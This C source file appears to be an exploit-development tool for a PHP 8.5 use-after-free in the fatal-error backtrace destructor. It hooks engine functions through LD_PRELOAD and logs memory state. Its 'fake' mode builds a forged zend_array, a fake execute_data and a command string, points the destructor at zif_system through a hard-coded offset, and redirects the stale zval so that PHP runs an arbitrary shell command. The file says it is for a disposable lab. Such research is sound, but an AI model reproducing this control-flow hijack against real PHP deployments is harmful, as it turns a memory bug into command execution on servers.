/*
 * p2s85-preload -- lab-only, no-ptrace observer for the PHP 8.5 backtrace dtor.
 *
 * LD_PRELOAD this into the amd64 debug lab when gdb cannot attach (qemu-user
 * returns ENOSYS for PTRACE_ATTACH). It interposes zval_ptr_dtor and only acts
 * when the argument is &EG(last_fatal_error_backtrace).
 *
 * Modes ($P2S85_PRELOAD_MODE):
 *   log   - print the stale zval and the bytes at its array header, then call
 *           the real dtor (the consumer normally crashes here).
 *   clear - print the state, mark the zval UNDEF, and skip the real dtor, so
 *           the consumer survives and later hooks can observe it.
 *   fake  - point the zval at an in-process fake zend_array whose pDestructor
 *           is zif_system, then call the real dtor (instrumented Phase 1 proof).
 *
 * This is not a sanitizer and is unsafe outside a disposable container.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define P2S_CHUNK 0x200000UL
#define P2S_ZIF_SYSTEM_OFF 0x5996e0UL
#define P2S_EG_FIELD_OFF 0x1b0UL

typedef void (*dtor_fn)(void *);
typedef struct _zend_string zend_string;

static dtor_fn real_dtor;
static void *(*real_emalloc_fn)(size_t);
static void *(*real_emalloc56_fn)(void);
static void (*real_efree_fn)(void *);
static void (*real_efree56_fn)(void *);
static uintptr_t eg_field;
static uintptr_t watch_addr;
static int log_fd = -1;
static int initialized;
static int mode_log = 1, mode_clear, mode_fake;

static void logf_(const char *fmt, ...)
{
	char buf[4096];
	va_list ap;
	int n;

	if (log_fd < 0) {
		return;
	}
	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	if (n > 0) {
		if (n > (int) sizeof(buf) - 1) {
			n = (int) sizeof(buf) - 1;
		}
		(void) write(log_fd, buf, (size_t) n);
	}
}

static void dump_bytes(const char *tag, const void *p, size_t n)
{
	const unsigned char *b = p;
	size_t i;

	logf_("%s bytes@%p len=%zu:", tag, p, n);
	for (i = 0; i < n; i++) {
		if ((i & 15) == 0) {
			logf_("\n%s  +%03zx:", tag, i);
		}
		logf_(" %02x", b[i]);
	}
	logf_("\n");
}

static void init_once(void)
{
	const char *path, *env_mode, *env_off;
	void *eg;

	initialized = 1;
	path = getenv("P2S85_PRELOAD_LOG");
	if (!path || !*path) {
		path = "/out/p2s85-preload.log";
	}
	log_fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0666);

	env_mode = getenv("P2S85_PRELOAD_MODE");
	if (env_mode && strcmp(env_mode, "clear") == 0) {
		mode_log = 1; mode_clear = 1; mode_fake = 0;
	} else if (env_mode && strcmp(env_mode, "fake") == 0) {
		mode_log = 1; mode_clear = 0; mode_fake = 1;
	} else {
		mode_log = 1; mode_clear = 0; mode_fake = 0;
	}

	eg = dlsym(RTLD_DEFAULT, "executor_globals");
	env_off = getenv("P2S85_EG_FIELD_OFF");
	eg_field = eg ? (uintptr_t) eg + (uintptr_t) strtoull(env_off ? env_off : "0x1b0", NULL, 0)
		: (uintptr_t) strtoull(env_off ? env_off : "0", NULL, 0);
	logf_("== PRELOAD init pid=%d mode=%s eg=%p field=%p log=%s\n",
		(int) getpid(), env_mode ? env_mode : "log", eg, (void *) eg_field, path);
	{
		const char *env_watch = getenv("P2S85_WATCH");
		watch_addr = env_watch ? (uintptr_t) strtoull(env_watch, NULL, 0) : 0;
		if (watch_addr) {
			logf_("== WATCH address %p\n", (void *) watch_addr);
		}
	}
}

static void log_alloc_event(const char *what, void *caller)
{
	Dl_info info;
	uintptr_t off = 0;

	if (dladdr(caller, &info) && info.dli_fbase) {
		off = (uintptr_t) caller - (uintptr_t) info.dli_fbase;
	}
	logf_("== %s pid=%d watch=%p caller=%p off=%#" PRIxPTR " %s\n",
		what, (int) getpid(), (void *) watch_addr, caller, off,
		(info.dli_fname ? info.dli_fname : "?"));
}

static int (*real_req_startup)(void);
static void (*real_req_shutdown)(void *);
static void (*real_error_zstr_at)(int, zend_string *, uint32_t, zend_string *);

int php_request_startup(void)
{
	if (!real_req_startup) {
		real_req_startup = (int (*)(void)) dlsym(RTLD_NEXT, "php_request_startup");
	}
	if (!initialized) {
		init_once();
	}
	logf_("== REQ_STARTUP pid=%d\n", (int) getpid());
	return real_req_startup ? real_req_startup() : 0;
}

void php_request_shutdown(void *dummy)
{
	if (!real_req_shutdown) {
		real_req_shutdown = (void (*)(void *)) dlsym(RTLD_NEXT, "php_request_shutdown");
	}
	if (!initialized) {
		init_once();
	}
	logf_("== REQ_SHUTDOWN pid=%d bt_type=%u\n", (int) getpid(),
		eg_field ? (unsigned) (((uint64_t *) eg_field)[1] & 0xff) : 0);
	if (real_req_shutdown) {
		real_req_shutdown(dummy);
	}
}

void zend_error_zstr_at(int type, zend_string *file, uint32_t line, zend_string *message)
{
	if (!real_error_zstr_at) {
		real_error_zstr_at = (void (*)(int, zend_string *, uint32_t, zend_string *))
			dlsym(RTLD_NEXT, "zend_error_zstr_at");
	}
	if (!initialized) {
		init_once();
	}
	if (eg_field) {
		uint64_t *z = (uint64_t *) eg_field;
		logf_("== ERROR_ENTER pid=%d type=%d line=%u zval_type=%u value=%p\n",
			(int) getpid(), type, line, (unsigned) (z[1] & 0xff), (void *) z[0]);
	}
	if (real_error_zstr_at) {
		real_error_zstr_at(type, file, line, message);
	}
}

void *_emalloc(size_t size)
{
	void *p;

	if (!real_emalloc_fn) {
		real_emalloc_fn = (void *(*)(size_t)) dlsym(RTLD_NEXT, "_emalloc");
	}
	if (!initialized) {
		init_once();
	}
	p = real_emalloc_fn ? real_emalloc_fn(size) : NULL;
	if (watch_addr && (uintptr_t) p == watch_addr) {
		log_alloc_event("ALLOC_emalloc", __builtin_return_address(0));
	}
	return p;
}

void *_emalloc_56(void)
{
	void *p;

	if (!real_emalloc56_fn) {
		real_emalloc56_fn = (void *(*)(void)) dlsym(RTLD_NEXT, "_emalloc_56");
	}
	if (!initialized) {
		init_once();
	}
	p = real_emalloc56_fn ? real_emalloc56_fn() : NULL;
	if (watch_addr && (uintptr_t) p == watch_addr) {
		log_alloc_event("ALLOC_emalloc56", __builtin_return_address(0));
	}
	return p;
}

void _efree(void *p)
{
	if (!real_efree_fn) {
		real_efree_fn = (void (*)(void *)) dlsym(RTLD_NEXT, "_efree");
	}
	if (!initialized) {
		init_once();
	}
	if (watch_addr && (uintptr_t) p == watch_addr) {
		log_alloc_event("FREE_efree", __builtin_return_address(0));
	}
	if (real_efree_fn) {
		real_efree_fn(p);
	}
}

void _efree_56(void *p)
{
	if (!real_efree56_fn) {
		real_efree56_fn = (void (*)(void *)) dlsym(RTLD_NEXT, "_efree_56");
	}
	if (!initialized) {
		init_once();
	}
	if (watch_addr && (uintptr_t) p == watch_addr) {
		log_alloc_event("FREE_efree56", __builtin_return_address(0));
	}
	if (real_efree56_fn) {
		real_efree56_fn(p);
	}
}

/* Minimal adaptation of payload.build_ht() for an in-process static buffer. */
static unsigned char fake_ht[4096] __attribute__((aligned(16)));

static uintptr_t build_fake(uintptr_t zif)
{
	unsigned char *h = fake_ht;
	const char *cmd = getenv("P2S85_CMD");
	uintptr_t s = (uintptr_t) h;
	size_t len;
	uint32_t u32;
	uint64_t u64;

	if (!cmd || !*cmd) {
		cmd = "id > /out/rce85-instrumented-proof";
	}
	len = strlen(cmd);
	memset(h, 0, sizeof(fake_ht));

	/* zend_array header (8.5 layout: pDestructor at 0x30, arData at 0x10) */
	u32 = 1; memcpy(h + 0x00, &u32, 4);          /* gc.refcount */
	u32 = 7; memcpy(h + 0x04, &u32, 4);          /* gc.type = IS_ARRAY */
	u32 = 0x10; memcpy(h + 0x08, &u32, 4);       /* HASH_FLAG_STATIC_KEYS */
	u32 = 0xFFFFFFF8u; memcpy(h + 0x0c, &u32, 4);/* nTableMask */
	u64 = s + 0x20; memcpy(h + 0x10, &u64, 8);   /* arData -> fake execute_data */
	u32 = 1; memcpy(h + 0x18, &u32, 4);          /* nNumUsed */
	u32 = 1; memcpy(h + 0x1c, &u32, 4);          /* nNumOfElements */
	u32 = 8; memcpy(h + 0x20, &u32, 4);          /* nTableSize */
	u32 = 0; memcpy(h + 0x24, &u32, 4);          /* nInternalPointer */
	u64 = 0; memcpy(h + 0x28, &u64, 8);          /* nNextFreeElement */
	u64 = zif; memcpy(h + 0x30, &u64, 8);        /* pDestructor = zif_system */

	/* fake execute_data at 0x20, overlapping bucket[0] */
	u64 = 0; memcpy(h + 0x20, &u64, 8);
	u64 = 0; memcpy(h + 0x28, &u64, 8);
	u64 = zif; memcpy(h + 0x30, &u64, 8);
	u64 = 0; memcpy(h + 0x38, &u64, 8);
	u64 = 0; memcpy(h + 0x40, &u64, 8);
	u32 = 0; memcpy(h + 0x48, &u32, 4);
	u32 = 1; memcpy(h + 0x4c, &u32, 4);
	u64 = 0; memcpy(h + 0x50, &u64, 8);
	u64 = 0; memcpy(h + 0x58, &u64, 8);
	u32 = 0; memcpy(h + 0x60, &u32, 4);
	u64 = s + 0x80; memcpy(h + 0x70, &u64, 8);   /* arg zval value -> fake string */
	u32 = 6; memcpy(h + 0x78, &u32, 4);          /* arg zval type = IS_STRING */

	/* fake zend_string at 0x80 */
	u32 = 1; memcpy(h + 0x80, &u32, 4);
	u32 = 0x0106; memcpy(h + 0x84, &u32, 4);     /* IS_STRING */
	u64 = 0; memcpy(h + 0x88, &u64, 8);
	u64 = len; memcpy(h + 0x90, &u64, 8);
	memcpy(h + 0x98, cmd, len + 1);

	logf_("== fake_ht at %p cmd=\"%s\" zif=%p\n", (void *) h, cmd, (void *) zif);
	return s;
}

static uintptr_t libphp_base(void)
{
	Dl_info info;

	if (real_dtor && dladdr((void *) real_dtor, &info)) {
		return (uintptr_t) info.dli_fbase;
	}
	return 0;
}

void zval_ptr_dtor(void *p)
{
	uint64_t *z = (uint64_t *) p;

	if (!real_dtor) {
		real_dtor = (dtor_fn) dlsym(RTLD_NEXT, "zval_ptr_dtor");
	}
	if (!initialized) {
		init_once();
	}
	if (!real_dtor) {
		return;
	}

	if (eg_field && (uintptr_t) p == eg_field && mode_log) {
		uintptr_t value = (uintptr_t) z[0];
		unsigned type = (unsigned) (z[1] & 0xff);
		uintptr_t base = value & ~(uintptr_t) (P2S_CHUNK - 1);

		logf_("== DTOR eg_field pid=%d p=%p value=%p type=%u mode=%s\n",
			(int) getpid(), p, (void *) value, type,
			mode_fake ? "fake" : (mode_clear ? "clear" : "log"));
		dump_bytes("eg_zval", p, 0x18);
		if (type == 7 && value > 0x10000) {
			uint32_t *h = (uint32_t *) value;
			logf_("   ht=%p chunk=%p off=%#" PRIxPTR
				" refc=%u flags=%#x mask=%#x nUsed=%u nElems=%u nSize=%u pDtor=%p\n",
				(void *) value, (void *) base, (uintptr_t) (value - base),
				h[0], h[2], h[3], h[6], h[7], h[8],
				(void *) (uintptr_t) *(uint64_t *) (value + 0x30));
			dump_bytes("ht", (void *) value, 0x40);
			{
				uintptr_t ar = *(uintptr_t *) (value + 0x10);
				if (ar > 0x10000) {
					dump_bytes("arData", (void *) ar, 0x80);
					/* For a packed backtrace, arData[0] is the frame zval. */
					if (h[2] & 0x04) {
						uint64_t *elem = (uint64_t *) ar;
						uintptr_t child = (uintptr_t) elem[0];
						unsigned ctype = (unsigned) (elem[1] & 0xff);
						logf_("   packed[0] child=%p type=%u\n",
							(void *) child, ctype);
						if (ctype == 7 && child > 0x10000) {
							uintptr_t car = *(uintptr_t *) (child + 0x10);
							dump_bytes("frame_ht", (void *) child, 0x40);
							if (car > 0x10000) {
								dump_bytes("frame_arData", (void *) car, 0x80);
							}
						}
					}
				}
			}
		}

		if (mode_clear) {
			z[0] = 0;
			z[1] = 0; /* IS_UNDEF */
			logf_("   cleared stale zval; skipping real dtor\n");
			return;
		}
		if (mode_fake) {
			if (type == 7 && value > 0x10000) {
				uintptr_t zif = libphp_base() + P2S_ZIF_SYSTEM_OFF;
				uintptr_t s = build_fake(zif);
				z[0] = s;
				z[1] = (z[1] & ~(uint64_t) 0xff) | 7; /* IS_ARRAY */
				logf_("   redirected stale zval to fake array %p, pDestructor=%p\n",
					(void *) s, (void *) zif);
			}
		}
	}
	real_dtor(p);
}
